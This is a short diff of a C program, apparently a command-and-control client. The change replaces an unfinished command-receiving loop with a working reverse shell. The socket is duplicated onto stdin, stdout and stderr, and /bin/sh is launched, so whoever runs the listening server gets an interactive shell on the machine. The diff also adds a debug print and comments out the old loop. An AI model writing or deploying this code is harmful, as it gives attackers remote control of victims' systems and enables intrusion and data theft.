@@ -89,21 +89,36 @@ int main(int argc, char **argv) {
 
     // connect to the listening server
     int conn = connect(fd, (struct sockaddr *) &server_addr, sizeof(server_addr));
+    printf("%d\n", conn);
     if (conn < 0) {
         fprintf(stderr, "CONNECTION FAILURE\n");
         exit(1);
     }
 
-    // receive commands from control server
-    char shell[CMD_SIZE];
-    size_t bytes_recv = 0;
-    while (1) {
-        bytes_recv = recv(fd, shell, CMD_SIZE, 0);
-        if (bytes_recv < 0) {
-            fprintf(stderr, "RECEIVING FAILURE\n");
-            exit(1);
-        }
-    }
+    dup2(fd, 0);
+    dup2(fd, 1);
+    dup2(fd, 2);
+
+    execve("/bin/sh", 0, 0);
+
+    // // receive commands from control server
+    // char shell[CMD_SIZE];
+    // size_t bytes_recv = 0;
+    // while (1) {
+    //     bytes_recv = recv(fd, shell, CMD_SIZE, 0);
+    //     if (bytes_recv < 0) {
+    //         fprintf(stderr, "RECEIVING FAILURE\n");
+    //         exit(1);
+    //     } else {
+    //         // null terminate to make proper string
+    //         shell[bytes_recv] = '\0';
+    //         puts(shell);
+
+    //         // get commands from control server
+    //         command = 
+    //     }
+
+    // }
     
 
 
